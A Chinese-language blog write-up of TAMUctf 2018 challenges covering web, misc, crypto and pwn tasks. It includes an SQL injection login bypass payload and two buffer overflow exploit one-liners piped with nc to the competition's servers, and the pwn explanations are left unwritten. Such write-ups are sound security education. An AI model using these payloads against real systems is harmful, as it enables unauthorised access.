---
title: TAMUctf 18
metaAlignment: center
coverMeta: out
thumbnailImagePosition: left
date: 2018-02-27 21:38:45
categories:
	- Writeups
	- TAMUctf18
thumbnailImage: cover.png
keywords:
    - TAMUctf18
    - Writeups
tags:
    - Writeups
    - TAMUctf18
---
10 天的 CTF 比賽
<!-- more -->
<!-- toc -->

# Intro
## [1 pts] Howdy!
簽到題，不解釋。

# Web
## [20 pts] Reading
不太懂這題的意義，總之原始碼 `Ctrl+F` 搜尋 `gigem{` 找唯一個有右大括號結尾的就是 flag。

## [40 pts] Bender
很簡單，看 `/robots.txt` 就可以了。

## [50 pts] Bubbles
簡單的 SQL Injection
```
Username: ' or 1=1 --
Password: ' or 1=1 --
```

# Misc
## [20 pts] breadsticks2
用 `file` 指令發現檔案格式為：`Microsoft OOXML`，直接把副檔名改成 `.docx` 就可以打開看到 flag 了。

## [25 pts] you can run, you can hide
連線進去環境以後 `ls -al` 看當前目錄底下看當前目錄底下的所有路徑，flag 就藏在 `~/.secret/.dont_delete_me.txt`。

# Crypto
## [100 pts] XORbytes
1. 利用 `$ xortool -m 100 -c 00 hexxy` 找出 xor 的 key：`QB1g3l4B5uzPjjD4`
2. 把 `heexy` 用相同的 key 再做一次 XOR 運算還原 ELF 檔案
3. 執行即可拿到 flag

# pwn
## [25 pts] pwn1
內容待補
```
Exploit:
$ python -c "print 'A'*(0x23-0x0C) + '\x11\xBA\x07\xF0'" | nc pwn.ctf.tamu.edu 4321
```

## [50 pts] pwn2
內容待補
```
Exploit:
$ python -c "print 'A'*(0xEF+4) + '\x4B\x85\x04\x08'" | nc pwn.ctf.tamu.edu 4322
```